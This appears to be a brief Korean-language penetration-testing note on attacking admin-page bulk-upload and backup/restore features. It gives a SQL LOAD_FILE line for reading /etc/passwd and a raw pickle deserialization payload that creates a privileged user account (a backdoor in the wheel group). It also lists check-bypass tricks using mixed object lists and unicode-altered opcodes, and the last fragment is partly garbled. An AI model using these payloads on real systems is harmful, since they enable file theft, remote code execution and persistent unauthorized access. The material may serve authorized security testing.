# Integrity Verification  
---------------------------------------------------------------------
관리자 페이지 내 편의성을 위한 한꺼번에 등록하거나  
특정 설정을 백업/복구하는 기능이 있을 경우  
해당 파일을 변조하여 서버 내 데이터 탈취 혹은 RCE 공격이 가능  
SELECT LOAD_FILE('/etc/passwd'); --  
(sql과 관련된 파일이 있을 경우)  
--------------------------------------------------------------------
pickle 역직렬화 공격
objects = [SafeObject(), BadObject()]  
첫 검사 로직 우회  

malicious_pickle_data = b'(cos\nsystem\nS"useradd -m -p $(openssl passwd -1 secui) secuiTestAccount && usermod -aG wheel secuiTestAccount"\no.  
문자열로 삽입

(U\2idios\nsystem\n.  
유니코드 삽입
